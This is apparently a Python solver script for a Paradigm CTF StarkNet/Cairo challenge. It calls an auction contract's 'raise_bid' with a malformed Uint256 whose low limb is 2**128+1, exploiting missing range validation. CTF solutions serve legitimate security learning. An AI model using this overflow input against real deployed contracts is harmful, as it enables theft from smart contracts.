from paradigmctf.cairo_challenge import *

from starknet_py.net import AccountClient
from starknet_py.contract import Contract

from starkware.starknet.public.abi import get_storage_var_address
from starkware.starknet.core.os.contract_address.contract_address import calculate_contract_address_from_hash


async def solver(client: AccountClient, auction_contract: Contract):
    result = await auction_contract.functions["raise_bid"].invoke(1, {"low": 2 ** 128 + 1, "high": 0}, max_fee=int(1e16))
    await result.wait_for_acceptance()

run_solver(solver)